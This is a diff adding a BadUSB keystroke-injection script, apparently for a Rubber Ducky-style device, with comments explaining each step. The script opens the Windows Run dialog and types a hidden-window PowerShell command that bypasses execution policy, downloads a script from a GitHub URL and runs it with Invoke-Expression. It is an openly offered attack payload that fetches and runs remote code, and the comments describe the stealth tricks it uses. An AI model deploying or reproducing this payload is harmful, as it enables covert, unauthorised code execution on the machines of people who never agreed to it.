@@ -1,0 +1,19 @@
+DELAY 200
+GUI r
+DELAY 100
+ALTSTRING powershell -w h -ExecutionPolicy Bypass -Command "& {Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/dyl4nz/Functions/main/powershell/Play-WAV/function.ps1'))}"
+ENTER
+REM ========================================================================================================================================================================================================================
+REM Anything from here below is just an explanation, the script will work perfectly fine without it and you should remove it if your badusb device has low storage.
+REM ========================================================================================================================================================================================================================
+REM "ALTSTRING" is used to type everything out using alt codes instead of normal keystrokes, this makes it possible to write things properly throughout systems, sometimes certain charachters arent typed if only "STRING" is used because of varying keyboard layouts
+REM "GUI r" is used to open the windows run dialog
+REM ========================================================================================================================================================================================================================
+REM "powershell" specifies for the following to be executed by powershell
+REM "-w h" is used to specify for the window style to be hidden, a shorthand version of "-WindowStyle Hidden", this makes it so that there is no powershell window that opens while executing
+REM "-ExecutionPolicy Bypass" is an arguement to ignore certain restrictions, its not always needed but is useful
+REM "-Command" specifies that the following should be considered as a command to be executed
+REM "& { }" Encloses the command to be executed within curly braces, indicating a script block.
+REM "Invoke-Expression" executes the script block as a powershell expression
+REM "((New-Object System.Net.WebClient).DownloadString('URL'))" Creates a new "WebClient" object and uses it to download the content from the specified URL.
+REM "https://raw.githubusercontent.com/dyl4nz/Functions/main/powershell/Play-WAV/function.ps1" is the link to the predefined code posted on github
